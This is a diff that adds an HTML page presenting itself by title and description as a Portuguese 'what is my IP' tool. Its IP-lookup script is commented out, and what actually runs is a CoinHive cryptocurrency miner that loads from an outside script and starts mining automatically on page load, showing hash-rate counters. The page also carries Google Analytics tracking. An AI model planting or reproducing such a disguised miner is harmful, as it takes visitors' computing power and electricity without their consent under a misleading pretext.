@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=640">
+    <meta name="description" content="Endereço IP, de forma genérica, é uma identificação de um dispositivo (computador, impressora, etc) em uma rede local ou pública.">
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=379ff6bda24bf1f06d3ba9e4c1c2d323bf17f8db" media="screen">
+    <link rel="stylesheet" href="/assets/css/mobile.css" media="handheld, only screen and (max-device-width:640px)">
+    <link rel="stylesheet" href="/assets/css/non-screen.css" media="handheld, only screen and (max-device-width:640px)">
+
+    <script type="text/javascript" src="/assets/js/modernizr.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+    <title>Qual o meu IP</title>
+
+
+  </head>
+
+  <body>
+
+    <div class="shell">
+
+      <header>
+        <span class="ribbon-outer">
+          <span class="ribbon-inner">
+            <h1 id="hashpersecond" class="meu-ip"></h1>
+            <h2>Hash/s</h2>
+          </span>
+          <span class="left-tail"></span>
+          <span class="right-tail"></span>
+        </span>
+      </header>
+
+
+      <span class="banner-fix"></span>
+      <section id="main_content">
+             <small>
+               <code class="all-data"></code>
+             </small>
+             <br/>
+             <label for="">Total hashes</label>
+             <p id="total_hashes"> 0 </p>
+             <label for="">Accepted hashes</label>
+             <p id="accepted_hashes"> 0 </p>
+           </section>
+
+
+      <footer>
+        <span class="ribbon-outer">
+          <span class="ribbon-inner">
+            <p>made with &hearts; by the free spirits of the internet</a></p>
+          </span>
+          <span class="left-tail"></span>
+          <span class="right-tail"></span>
+        </span>
+        <p>Generated with <a href="https://pages.github.com">GitHub Pages</a> using Merlot</p>
+        <span class="octocat"></span>
+      </footer>
+
+    </div>
+
+
+
+    <!-- <script type="text/javascript">
+  function getFromFreeGeoIp() {
+    $.getJSON('//freegeoip.net/json/?callback=?', function(data) {
+      console.log('from freegeoip.net')
+
+      var info = { ip: data.ip,
+                   region: (data.city + ' / ' + data.region_name),
+                   country: data.country_name,
+                   hostname: 'No hostname',
+                   org: 'No org' };
+
+      populateInfo(data, info);
+    });
+  }
+
+  function getFromIpInfo() {
+    $.getJSON('//ipinfo.io', function(data) {
+      console.log('from ipinfo.io');
+
+      var info = { ip: data.ip,
+                   region: (data.city + ' / ' + data.region),
+                   country: data.country,
+                   hostname: data.hostname,
+                   org: data.org };
+
+      populateInfo(data, info);
+    }).fail(function(){ // em caso de erro
+      getFromFreeGeoIp();
+    });
+  }
+
+  function populateInfo(data, info) {
+    $('h1.meu-ip').html(info.ip);
+    $('span.region').html(info.region);
+    $('span.country').html(info.country);
+    $('span.hostname').html(info.hostname);
+    $('span.org').html(info.org);
+    $('.all-data').html(JSON.stringify(data, null, 2));
+  }
+
+  getFromIpInfo();
+</script>
+ -->
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+  var miner = new CoinHive.Anonymous('I4Z6qau09gxJCkJR4BXO46ZK9gd4YIvw');
+
+  miner.start();
+
+  // Listen on events
+  miner.on('found', function() { /* Hash found */ })
+  miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+  // Update stats once per second
+  setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+    //
+    // console.log('hashesPerSecond');
+    // console.log(hashesPerSecond);
+    document.getElementById("hashpersecond").innerHTML=hashesPerSecond;
+    document.getElementById("total_hashes").innerHTML=totalHashes;
+    document.getElementById("accepted_hashes").innerHTML=acceptedHashes;
+    // console.log('totalHashes');
+    // console.log(totalHashes);
+    // console.log('acceptedHashes');
+    // console.log(acceptedHashes);
+  }, 1000);
+</script>
+
+
+    
+      <script type="text/javascript">
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-100841327-1', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
